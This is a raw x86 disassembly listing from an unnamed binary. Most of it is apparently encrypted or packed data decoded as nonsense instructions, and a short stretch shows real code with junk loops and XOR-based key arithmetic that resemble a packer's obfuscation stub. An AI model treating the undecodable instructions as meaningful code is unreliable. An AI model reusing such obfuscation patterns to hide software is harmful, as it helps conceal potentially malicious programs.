  4028f9:	mov    ch,0x9f
  4028fb:	fwait
  4028fc:	cli    
  4028fd:	xchg   ebx,eax
  4028fe:	pushw  cs
  402900:	nop
  402901:	xchg   ebx,eax
  402902:	jl     0x4028af
  402904:	(bad)  
  402905:	iret   
  402906:	lods   eax,DWORD PTR ds:[esi]
  402907:	mov    ch,0x73
  402909:	mov    esp,0x9f05a7dc
  40290e:	in     al,0x8a
  402910:	xchg   DWORD PTR [ebx],ebx
  402912:	jg     0x40292a
  402914:	call   0x2f81:0x18f5a73d
  40291b:	dec    ebp
  40291c:	mov    ebp,0x7a23aba1
  402921:	add    DWORD PTR [edi+0x6e],0x9b707548
  402928:	sbb    BYTE PTR [eax],dh
  40292a:	xchg   edx,eax
  40292b:	retf   0x780e
  40292e:	retf   0x154a
  402931:	jmp    0x4b4e:0x6ce18dff
  402938:	and    eax,0x5eadac62
  40293d:	shr    DWORD PTR [esi+0x2e38bcd9],cl
  402943:	mov    edx,0x24776902
  402948:	jmp    0x402994
  40294a:	lds    ebp,FWORD PTR [esi]
  40294c:	int3   
  40294d:	dec    esp
  40294e:	dec    ecx
  40294f:	jbe    0x4029cb
  402951:	dec    eax
  402952:	mov    esi,0x6dcab00d
  402957:	jnp    0x40292a
  402959:	and    ch,dl
  40295b:	inc    ebx
  40295c:	or     BYTE PTR [ebp-0x77],ah
  40295f:	das    
  402960:	stos   BYTE PTR es:[edi],al
  402961:	xor    cl,BYTE PTR [edx+0x6efd1070]
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x2e581c35
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x5570707e
  402afd:	mov    bh,0xe
  402aff:	stc    
  402b00:	idiv   ebx
  402b02:	loopne 0x402ab1
  402b04:	mov    BYTE PTR [ecx+0x161c6c01],0xf7
  402b0b:	mov    ebx,0x78c42c68
  402b10:	test   BYTE PTR [ecx],0xda
  402b13:	push   eax
  402b14:	out    dx,al
  402b15:	fldcw  WORD PTR [edi+0x36]
  402b18:	inc    ebp
  402b19:	fsub   QWORD PTR [ebp+esi*8-0x36beb156]
  402b20:	and    dh,BYTE PTR [edx+0x1ab285f4]
  402b26:	test   al,0x1b
  402b28:	or     edx,ebx
  402b2a:	mov    ecx,0xa970313f
  402b2f:	xor    al,0xc9
  402b31:	sbb    DWORD PTR [eax],0xcb5ac823
  402b37:	fcmovbe st,st(1)
  402b39:	jge    0x402b72
  402b3b:	mov    al,0x23
  402b3d:	adc    ebx,edi
  402b3f:	mov    eax,ds:0x7cbcd23c
  402b44:	pop    eax
  402b45:	pushf  
  402b46:	shl    dh,cl
  402b48:	adc    bl,BYTE PTR ds:0x3dd5df75
  402b4e:	adc    eax,0xc742a2f8
  402b53:	retf   0x4234
  402b56:	add    BYTE PTR [eax+0x11dfcc16],0xcd
  402b5d:	sti    
  402b5e:	jno    0x402b5b
  402b60:	push   ss
  402b61:	add    eax,0x7a306b1a
  402b66:	loop   0x402b33
  402b68:	rcl    ah,0x10
  402b6b:	xor    BYTE PTR gs:[edi+0x37],dh
  402b6f:	sar    edx,0x53
  402b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b73:	mov    edx,0x662feb3d
  402b78:	mov    eax,0xb0e054c5
  402b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b7e:	fs rcr BYTE PTR cs:[ecx-0x7c63caee],cl
  402b86:	jg     0x402be0
  402b88:	repz std 
  402b8a:	bt     DWORD PTR [ebp-0x70],edi
  402b8e:	aam    0x77
  402b90:	xchg   ebx,eax
  402b91:	das    
  402b92:	mov    eax,0xa5f8badf
  402b97:	dec    ebp
  402b98:	pop    ebx
  402b99:	push   ss
  402b9a:	popa   
  402b9b:	push   edx
  402b9c:	outs   dx,BYTE PTR ds:[esi]
  402b9d:	add    BYTE PTR [esi],al
  402b9f:	sub    al,0x9b
  402ba1:	ficomp DWORD PTR [ebp-0x686dae9d]
  402ba7:	ds ss mov esp,0xff0ad490
  402bae:	jp     0x402b42
  402bb0:	je     0x402b8c
  402bb2:	cli    
  402bb3:	sbb    al,al
  402bb5:	mov    eax,ds:0xf664893b
  402bba:	iret   
  402bbb:	cs adc al,0x80
  402bbe:	mov    es,WORD PTR [esi-0x411fd07f]
  402bc4:	mov    dh,0xc4
  402bc6:	test   BYTE PTR [esi+0x1464c937],0x1a
  402bcd:	push   0xfffffff5
  402bcf:	sub    ecx,DWORD PTR [esi+0x2be0f44c]
  402bd5:	jl     0x402c51
  402bd7:	push   0x9e89789b
  402bdc:	sar    ah,0xfd
  402bdf:	or     al,0x68
  402be1:	mov    bl,0xe6
  402be3:	test   BYTE PTR [ebp+0x3d],bl
  402be6:	std    
  402be7:	xchg   ebx,eax
  402be8:	fild   DWORD PTR [ebx+eax*8-0xb5d6dad]
  402bef:	sbb    eax,0xc85b3083
  402bf4:	push   esp
  402bf5:	popa   
  402bf6:	(bad)  
  402bf7:	bound  eax,QWORD PTR [ebx-0x696cd495]
  402bfd:	jnp    0x402c5a
  402bff:	pop    ds
  402c00:	jo     0x402c37
  402c02:	retf   
  402c03:	push   eax
  402c04:	jmp    0x975e:0x9bfebc6
  402c0b:	xlat   BYTE PTR ds:[ebx]
  402c0c:	and    ebp,edx
  402c0e:	pop    ss
  402c0f:	and    dh,bh
  402c11:	loope  0x402bdb
  402c13:	mov    dh,0xb
  402c15:	push   esp
  402c16:	cld    
  402c17:	jno    0x402b9b
  402c19:	call   0x4856:0xc1860f1d
  402c20:	jle    0x402c50
  402c22:	pop    es
  402c23:	rsqrtps xmm0,XMMWORD PTR [ebx-0x24]
  402c27:	stc    
  402c28:	xor    esi,ebx
  402c2a:	in     eax,dx
  402c2b:	call   0xb2489ab5
  402c30:	xchg   edi,eax
  402c31:	sub    bh,0x67
  402c34:	mov    al,0xf5
  402c36:	xchg   edi,eax
  402c37:	dec    ebp
  402c38:	jecxz  0x402c7b
  402c3a:	xor    DWORD PTR [esi+0x7f],0x1363b480
  402c41:	mov    ebx,0x8ccf9cb0
  402c46:	pop    ds
  402c47:	(bad)  
  402c49:	call   0x2291754a
  402c4e:	std    
  402c4f:	jmp    0x5daa:0x694c20b6
  402c56:	jp     0x402ccf
  402c58:	dec    edx
  402c59:	(bad)  
  402c5a:	jl     0x402c1d
  402c5c:	loope  0x402be2
  402c5e:	out    dx,eax
  402c5f:	div    DWORD PTR gs:[eax-0x24]
  402c63:	xor    DWORD PTR [edi],ebx
  402c65:	call   0xeb1c:0x8937bcea
  402c6c:	or     cl,dh
  402c6e:	pop    esi
  402c6f:	addr16 out dx,eax
  402c71:	rcl    bh,1
  402c73:	fild   QWORD PTR [edx-0x5d3662d2]
  402c79:	mov    edi,0xf3792837
  402c7e:	inc    ecx
  402c7f:	loop   0x402c19
  402c81:	dec    eax
  402c82:	inc    edx
  402c83:	shl    DWORD PTR [ecx+eax*1],0x69
  402c87:	pop    ss
  402c88:	pop    es
  402c89:	or     DWORD PTR [ecx-0x8121788],0xe3ae8a02
  402c93:	inc    ecx
  402c94:	test   DWORD PTR [edi+0x56],eax
  402c97:	out    dx,al
  402c98:	pusha  
  402c99:	xchg   BYTE PTR [ecx-0x28],bl
  402c9c:	jle    0x402c6f
  402c9e:	into   
  402c9f:	and    DWORD PTR [eax+eiz*4-0xaad203d],0xffffffa2
  402ca7:	add    DWORD PTR [esi],ebx
  402ca9:	cld    
  402caa:	xchg   ebp,eax
  402cab:	mov    ?,edi
  402cad:	fdiv   QWORD PTR [eax]
  402caf:	push   ds
  402cb0:	dec    ebp
  402cb1:	or     ch,dh
  402cb3:	mov    eax,ds:0xdfd60401
  402cb8:	std    
  402cb9:	push   eax
  402cba:	and    BYTE PTR [ebp+0x4b],ch
  402cbd:	push   esp
  402cbe:	jecxz  0x402d1d
  402cc0:	dec    esi
  402cc1:	in     eax,0xd7
  402cc3:	stos   DWORD PTR es:[edi],eax
  402cc4:	dec    edx
  402cc5:	mov    al,ds:0xf1236ef9
  402cca:	call   0x1351:0x9f600cdb
  402cd1:	push   es
  402cd2:	sub    DWORD PTR [ebx+0x723b99e7],esp
  402cd8:	push   ebp
  402cd9:	mov    esi,0xfcfbf000
  402cde:	jle    0x402d57
  402ce0:	icebp  
  402ce1:	jae    0x402d3d
  402ce3:	out    dx,eax
  402ce4:	fdiv   QWORD PTR [ecx-0x77dfd37]
  402cea:	adc    esp,DWORD PTR [esp+ecx*2-0x480fcb14]
  402cf1:	inc    esp
  402cf2:	retf   0x7dbd
  402cf5:	inc    ecx
  402cf6:	test   DWORD PTR [ecx+0x7bcd6f95],ebp
  402cfc:	fdiv   QWORD PTR [edi-0x1f]
  402cff:	int    0x5e
  402d01:	dec    edi
  402d02:	loopne 0x402d6f
  402d04:	out    0x41,al
  402d06:	dec    ebp
  402d07:	cwde   
  402d08:	test   BYTE PTR ds:0x19d353e9,bl
  402d0e:	jecxz  0x402cd6
  402d10:	mov    bh,0x52
  402d12:	scas   al,BYTE PTR es:[edi]
  402d13:	jne    0x402ca3
  402d15:	mov    cl,ch
  402d17:	inc    al
  402d19:	cmp    cl,ah
  402d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d1c:	ins    DWORD PTR es:[edi],dx
  402d1d:	push   cs
  402d1e:	mov    eax,ds:0xdb39e024
  402d23:	dec    ebp
  402d24:	mov    al,0xbe
  402d26:	and    esp,DWORD PTR [esi-0x35]
  402d29:	(bad)  
  402d2a:	jmp    0x7eef76b4
  402d2f:	add    dl,cl
  402d31:	cwde   
  402d32:	ret    0x4154
  402d35:	ja     0x402d0d
  402d37:	leave  
  402d38:	sbb    BYTE PTR [eax-0x34c632b3],ah
  402d3e:	test   DWORD PTR [esi-0x7f],eax
  402d41:	xchg   ebx,eax
  402d42:	arpl   dx,dx
  402d44:	(bad)  
  402d45:	clc    
  402d46:	or     BYTE PTR [edx],ch
  402d48:	out    dx,eax
  402d49:	in     eax,dx
  402d4a:	cvtdq2ps xmm5,XMMWORD PTR ds:0xbfb29b58
  402d51:	mov    edx,0x693b2e95
  402d56:	mov    edi,0xa34ba1b3
  402d5b:	leave  
  402d5c:	sbb    al,BYTE PTR [ebx-0x1b]
  402d5f:	mov    BYTE PTR [esi-0x2c],bh
  402d62:	lahf   
  402d63:	mov    dh,0xc
  402d65:	inc    ecx
  402d66:	add    al,cl
  402d68:	ja     0x402db3
  402d6a:	rcl    BYTE PTR [edx+0x1a],1
  402d6d:	mov    dh,0x76
  402d6f:	or     dl,dh
  402d71:	push   eax
  402d72:	cdq    
  402d73:	push   ds
  402d74:	cld    
  402d75:	jno    0x402de4
  402d77:	jo     0x402d73
  402d79:	inc    esp
  402d7a:	jne    0x402d49
  402d7c:	and    DWORD PTR [edi+0x4917b1d2],edi
  402d82:	sbb    al,0xd4
  402d84:	lods   al,BYTE PTR ds:[esi]
  402d85:	add    DWORD PTR [ecx+0x1c],0x43a5c94f
  402d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d8d:	pop    esp
  402d8e:	jae    0x402d13
  402d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d91:	cs stc 
  402d93:	(bad)  
  402d94:	sub    al,0x5f
  402d96:	or     eax,0x8cdad85f
  402d9b:	or     DWORD PTR [edx+0x6df4cb90],edi
  402da1:	daa    
  402da2:	xchg   edi,eax
  402da3:	sbb    BYTE PTR [eax],bl
  402da5:	jmp    DWORD PTR [ecx]
  402da7:	dec    edx
  402da8:	xor    bl,BYTE PTR [edi+0x2b436907]
  402dae:	add    ecx,DWORD PTR [eax]
  402db0:	pushf  
  402db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402db2:	data16 xlat BYTE PTR ds:[ebx]
  402db4:	jmp    0x984:0xebec982a
  402dbb:	js     0x402db5
  402dbd:	jmp    0xd77c03c5
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	cmp    BYTE PTR [edi],ah
  402de1:	xor    ebp,DWORD PTR [esi+0x70700abe]
  402de7:	mov    esi,0xba70707e
  402dec:	xchg   ebx,eax
  402ded:	cmp    DWORD PTR [ecx],0x25
  402df0:	pushf  
  402df1:	fnstsw WORD PTR [edi]
  402df3:	xchg   ebp,eax
  402df4:	pusha  
  402df5:	sbb    DWORD PTR [edi+0x7a],edi
  402df8:	(bad)  
  402dfa:	dec    esi
  402dfb:	push   es
  402dfc:	dec    edx
  402dfd:	icebp  
  402dfe:	cmp    al,0xdd
  402e00:	stc    
  402e01:	popf   
  402e02:	out    0xa5,eax
  402e04:	push   edi
  402e05:	adc    BYTE PTR [esi],dl
  402e07:	jmp    0x402e02
  402e09:	mov    DWORD PTR [edi*4-0x7f69caa4],ebp
  402e10:	lea    edi,[ecx]
  402e12:	in     al,dx
  402e13:	add    esi,DWORD PTR [esi+0x25ca5e09]
  402e19:	pop    ecx
  402e1a:	scas   eax,DWORD PTR es:[edi]
  402e1b:	and    ah,ah
  402e1d:	and    bh,BYTE PTR [ebp-0x67]
  402e20:	adc    eax,0x2944402f
  402e25:	or     edx,0xffffffc1
  402e28:	add    cl,al
  402e2a:	and    DWORD PTR [ebx+0x35f109ed],edx
  402e30:	pop    ebp
  402e31:	mov    dh,0xf7
  402e33:	xor    ch,BYTE PTR [ebx-0x17]
  402e36:	dec    ebp
  402e37:	push   es
  402e38:	jl     0x402dc6
  402e3a:	inc    ebp
  402e3b:	ja     0x402e61
  402e3d:	xchg   edx,eax
  402e3e:	retf   0x9e1d
  402e41:	adc    eax,0x1fc33b91
  402e46:	mov    ds:0x6d028e83,al
  402e4b:	cwde   
  402e4c:	ja     0x402e80
  402e4e:	arpl   WORD PTR [eax+edi*2-0x4f],cx
  402e52:	cmp    eax,0x139e6e55
  402e57:	ins    DWORD PTR es:[edi],dx
  402e58:	pusha  
  402e59:	stos   DWORD PTR es:[edi],eax
  402e5a:	cmp    ebx,DWORD PTR [esi]
  402e5c:	enter  0xb8b3,0xf
  402e60:	mov    BYTE PTR [eax+0x7661bec6],al
  402e66:	loope  0x402ed9
  402e68:	mov    esp,0xf6fb70e5
  402e6d:	mov    al,ds:0x2dff9bad
  402e72:	cmp    DWORD PTR [eax-0x46],0xffffffb5
  402e76:	cmp    ch,BYTE PTR [edi]
  402e78:	jge    0x402dfa
  402e7a:	xlat   BYTE PTR ds:[ebx]
  402e7b:	dec    edx
  402e7c:	pop    es
  402e7d:	jmp    0x67c7:0xb0a8e9f6
  402e84:	es push esi
  402e86:	int3   
  402e87:	mov    ah,0x38
  402e89:	dec    edx
  402e8a:	jl     0x402e17
  402e8c:	cli    
  402e8d:	popf   
  402e8e:	aas    
  402e8f:	pop    ss
  402e90:	xchg   ecx,eax
  402e91:	icebp  
  402e92:	addr16 mov dh,0x34
  402e95:	or     DWORD PTR [esp+esi*1],edi
  402e98:	cdq    
  402e99:	sub    eax,0x54516f66
  402e9e:	mov    eax,ds:0x678abee9
  402ea3:	xchg   ebp,eax
  402ea4:	int    0xbc
  402ea6:	imul   esi,DWORD PTR [ecx+edx*1-0x64],0xd72bd4e6
  402eae:	xchg   edi,eax
  402eaf:	xchg   esi,eax
  402eb0:	test   al,0xc8
  402eb2:	in     al,dx
  402eb3:	lods   eax,DWORD PTR ds:[esi]
  402eb4:	jno    0x402e62
  402eb6:	rol    DWORD PTR [eax+0x50],1
  402eb9:	mov    eax,0x473cd3ae
  402ebe:	nop
  402ebf:	shl    DWORD PTR [edx+0x1f],0xd7
  402ec3:	aas    
  402ec4:	mov    bl,0x6c
  402ec6:	mov    edi,edx
  402ec8:	mov    edi,DWORD PTR [edx+0x7b6d9cfb]
  402ece:	int3   
  402ecf:	xchg   ebx,eax
  402ed0:	imul   esp,DWORD PTR [edi+esi*4+0x66eb5482],0x6ea1ca06
  402edb:	(bad)  [esi-0x335cbf39]
  402ee1:	mov    dh,0x2a
  402ee3:	xor    BYTE PTR [esi],0x58
  402ee6:	jbe    0x402e93
  402ee8:	sar    DWORD PTR [ecx],1
  402eea:	call   0x695f7e7d
  402eef:	cmp    al,0x9c
  402ef1:	adc    ch,BYTE PTR [ebp+0x2b]
  402ef4:	loope  0x402f3b
  402ef6:	test   al,0x1a
  402ef8:	cld    
  402ef9:	js     0x402f79
  402efb:	mov    dl,0x76
  402efd:	imul   ebx,DWORD PTR [ebp+0x5c],0x469a9c20
  402f04:	jne    0x402e8e
  402f06:	xchg   ebp,eax
  402f07:	push   ebx
  402f08:	inc    esi
  402f09:	or     eax,0x97a911f
  402f0e:	test   eax,0x503cba6
  402f13:	cdq    
  402f14:	push   es
  402f15:	pop    es
  402f16:	hlt    
  402f17:	(bad)  
  402f18:	stos   BYTE PTR es:[edi],al
  402f19:	inc    edx
  402f1a:	and    BYTE PTR [edi+0x1979d893],ch
  402f20:	mov    esi,0x9b26af22
  402f25:	stos   DWORD PTR es:[edi],eax
  402f26:	mov    esp,0xba0ff99d
  402f2b:	and    eax,esp
  402f2d:	pop    ebp
  402f2e:	mov    eax,ds:0x46eec682
  402f33:	cli    
  402f34:	loop   0x402edb
  402f36:	pop    edx
  402f37:	les    edi,FWORD PTR [esi+0x5de01301]
  402f3d:	pop    esp
  402f3e:	pusha  
  402f3f:	aam    0x88
  402f41:	dec    ebp
  402f42:	and    al,0xa
  402f44:	push   es
  402f45:	and    edi,edi
  402f47:	mov    cl,0xaf
  402f49:	pop    edi
  402f4a:	and    DWORD PTR [edi+0xf],ebp
  402f4d:	xor    al,0x2c
  402f4f:	and    DWORD PTR [eax+edx*1],eax
  402f52:	or     BYTE PTR [ebx+0x46],ch
  402f55:	or     eax,0x3ae4df15
  402f5a:	stos   BYTE PTR es:[edi],al
  402f5b:	ror    bh,cl
  402f5d:	dec    ebp
  402f5e:	push   0xffffffb8
  402f60:	inc    eax
  402f61:	adc    DWORD PTR [edi-0x76],esi
  402f64:	lods   eax,DWORD PTR ds:[esi]
  402f65:	dec    edx
  402f66:	pop    edx
  402f67:	imul   ebp,DWORD PTR [ebx+0x1dc91cb1],0xe41e69e3
  402f71:	in     eax,dx
  402f72:	cli    
  402f73:	jp     0x402fd9
  402f75:	and    eax,0x3c689115
  402f7a:	jmp    0x147:0x3b0302b6
  402f81:	mov    esi,0x33e3df37
  402f86:	cmp    eax,0xb2d2c386
  402f8b:	repnz cmp esi,DWORD PTR [edx-0x6afe14c8]
  402f92:	pop    ecx
  402f93:	pop    ss
  402f94:	fldenv [ebp-0x15]
  402f97:	mov    cl,0x8e
  402f99:	inc    ebp
  402f9a:	pop    ss
  402f9b:	push   edx
  402f9c:	sbb    al,0xe7
  402f9e:	mov    ecx,0x47f9599f
  402fa3:	dec    ecx
  402fa4:	lods   eax,DWORD PTR ds:[esi]
  402fa5:	and    esp,esi
  402fa7:	outs   dx,DWORD PTR ds:[esi]
  402fa8:	mov    DWORD PTR [ebp-0x897876e],ecx
  402fae:	sbb    al,0x8d
  402fb0:	jp     0x402fd4
  402fb2:	sti    
  402fb3:	imul   esi,DWORD PTR [ecx+0x3e],0x3d6c3fea
  402fba:	popa   
  402fbb:	daa    
  402fbc:	mov    ebp,0x263b4806
  402fc1:	pop    sp
  402fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fc4:	ret    
  402fc5:	test   eax,0x4288a0bc
  402fca:	xchg   esi,eax
  402fcb:	jo     0x402ff1
  402fcd:	call   0xc5fa:0x6f77de36
  402fd4:	(bad)  
  402fd5:	les    edi,FWORD PTR [ebx]
  402fd7:	sub    DWORD PTR [ecx-0x54],0xffffffda
  402fdb:	loop   0x403033
  402fdd:	inc    BYTE PTR [esi]
  402fdf:	in     eax,0xc4
  402fe1:	std    
  402fe2:	jae    0x40304e
  402fe4:	pop    ss
  402fe5:	ret    0x3833
  402fe8:	dec    edx
  402fe9:	mov    edi,0x3aef7771
  402fee:	pushf  
  402fef:	outs   dx,DWORD PTR ds:[esi]
  402ff0:	cmc    
  402ff1:	xor    BYTE PTR [esi+0x44],al
  402ff4:	aad    0x3
  402ff6:	test   al,0x69
  402ff8:	int3   
  402ff9:	xchg   ebx,eax
  402ffa:	jmp    0xfbb3:0xf1fba273
  403001:	pop    edx
  403002:	jp     0x403004
  403004:	inc    eax
  403005:	sahf   
  403006:	push   eax
  403007:	mov    ah,0xf2
  403009:	aam    0x2a
  40300b:	inc    eax
  40300c:	xchg   DWORD PTR [edx],esi
  40300e:	(bad)  
  40300f:	test   eax,0x4a99bf5b
  403014:	mov    esp,0x54f59409
  403019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40301a:	jmp    0x40301a
  40301c:	and    esi,eax
  40301e:	push   cs
  40301f:	inc    BYTE PTR [ebx+0x4f013b44]
  403025:	pusha  
  403026:	push   esi
  403027:	mov    esi,0xa7e9e188
  40302c:	fiadd  WORD PTR [eax-0xa]
  40302f:	sbb    DWORD PTR [esi*1-0x3563619],esp
  403036:	jmp    0x1181:0x755d524e
  40303d:	push   ss
  40303e:	dec    ebp
  40303f:	cmp    BYTE PTR [edi-0x40],bl
  403042:	lds    esp,FWORD PTR [ebp-0x3d87a59e]
  403048:	mov    bl,BYTE PTR [esi+0x39]
  40304b:	scas   al,BYTE PTR es:[di]
  40304d:	test   ebx,edx
  40304f:	pop    edi
  403050:	pop    ss
  403051:	push   eax
  403052:	clc    
  403053:	xlat   BYTE PTR ds:[ebx]
  403054:	shr    DWORD PTR [eax-0x4],0x5e
  403058:	pushf  
  403059:	cld    
  40305a:	pop    edx
  40305b:	mov    ecx,0x5ad806d9
  403060:	out    0xf6,eax
  403062:	and    dl,dh
  403064:	int    0x4e
  403066:	xor    al,0x20
  403068:	add    al,BYTE PTR [ebp-0x264ba12c]
  40306e:	aaa    
  40306f:	or     DWORD PTR [ebx],edi
  403071:	int    0x8c
  403073:	and    ecx,DWORD PTR [ecx-0x2d]
  403076:	and    DWORD PTR [eax],ecx
  403078:	inc    ebx
  403079:	inc    edi
  40307a:	loope  0x40303c
  40307c:	push   ecx
  40307d:	loope  0x4030ad
  40307f:	push   cs
  403080:	jns    0x403028
  403082:	jmp    0x403007
  403084:	pop    eax
  403085:	inc    ebx
  403086:	mov    bl,0x7d
  403088:	es leave 
  40308a:	out    dx,al
  40308b:	sbb    esi,DWORD PTR [ebp-0x640e64ad]
  403091:	jle    0x403099
  403093:	(bad)
  403096:	inc    ebp
  403097:	retf   0xdff9
  40309a:	xor    edx,DWORD PTR [ebx]
  40309c:	inc    ebx
  40309d:	pop    ds
  40309e:	xchg   DWORD PTR [edx-0xc251e39],edi
  4030a4:	popf   
  4030a5:	cmp    dl,bl
  4030a7:	xchg   edx,eax
  4030a8:	test   al,0xa
  4030aa:	cmp    bh,ch
  4030ac:	jp     0x40306c
  4030ae:	pushf  
  4030af:	jb     0x4030e3
  4030b1:	add    BYTE PTR [ebx+0x7d8bf845],cl
  4030b7:	cld    
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xe3
  4030ce:	mov    bh,0xdb
  4030d0:	lods   al,BYTE PTR ds:[esi]
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0xd970707e
  4030da:	adc    bl,0xf1
  4030dd:	adc    bh,ch
  4030df:	int    0x75
  4030e1:	pusha  
  4030e2:	sub    al,0xb4
  4030e4:	cwde   
  4030e5:	bound  eax,QWORD PTR [ebp+0x47b63797]
  4030eb:	std    
  4030ec:	mov    al,0x3b
  4030ee:	aad    0xa7
  4030f0:	mov    eax,ds:0x8132a063
  4030f5:	repnz and bl,BYTE PTR [ebx+eax*4]
  4030f9:	jno    0x4030ad
  4030fb:	into   
  4030fc:	jo     0x4030e4
  4030fe:	aam    0xc6
  403100:	xchg   esi,eax
  403101:	jge    0x40314c
  403103:	sbb    DWORD PTR [edx-0x48bf2d6],ebx
  403109:	push   ebp
  40310a:	sti    
  40310b:	push   edi
  40310c:	jge    0x40313b
  40310e:	dec    ecx
  40310f:	(bad)  [edi+edx*8]
  403112:	adc    eax,0xffffffa9
  403115:	push   ss
  403116:	(bad)
  40311b:	int    0xdd
  40311d:	push   edx
  40311e:	sbb    BYTE PTR [esi+0x2b],cl
  403121:	cmp    al,0xc7
  403123:	ret    0x5b17
  403126:	and    BYTE PTR [esi],0xc8
  403129:	jle    0x40319d
  40312b:	dec    edi
  40312c:	inc    esi
  40312d:	xor    ebp,DWORD PTR gs:[edi+0x7afb5596]
  403134:	push   edx
  403135:	pop    ss
  403136:	xor    dl,BYTE PTR [ebp-0x55]
  403139:	push   eax
  40313a:	leave  
  40313b:	mov    eax,0x97901774
  403140:	data16 and BYTE PTR [edx-0x4c],dl
  403144:	jb     0x40311d
  403146:	cmp    DWORD PTR ss:[ecx+0x58],ebx
  40314a:	xchg   ebp,eax
  40314b:	(bad)  
  40314c:	fstp   QWORD PTR [ecx-0x2232fd1c]
  403152:	pmaddwd mm4,mm2
  403155:	push   ss
  403156:	sub    al,0x74
  403158:	ficomp WORD PTR es:[eax-0x5a]
  40315c:	cmp    dh,ah
  40315e:	ficomp WORD PTR [eax+edx*4]
  403161:	cmp    al,0x4e
  403163:	jmp    0x8a05cc39
  403168:	pop    ebp
  403169:	cmp    eax,0x2c9a3816
  40316e:	push   0xffffff85
  403170:	lock mov bh,0x7f
  403173:	mov    ds:0x6820b5ee,eax
  403178:	dec    ebx
  403179:	arpl   WORD PTR [edi+0x3f1e85a2],sp
  40317f:	icebp  
  403180:	push   DWORD PTR [eax]
  403182:	ret    
  403183:	ret    
  403184:	mov    esi,0x2050b009
  403189:	in     eax,dx
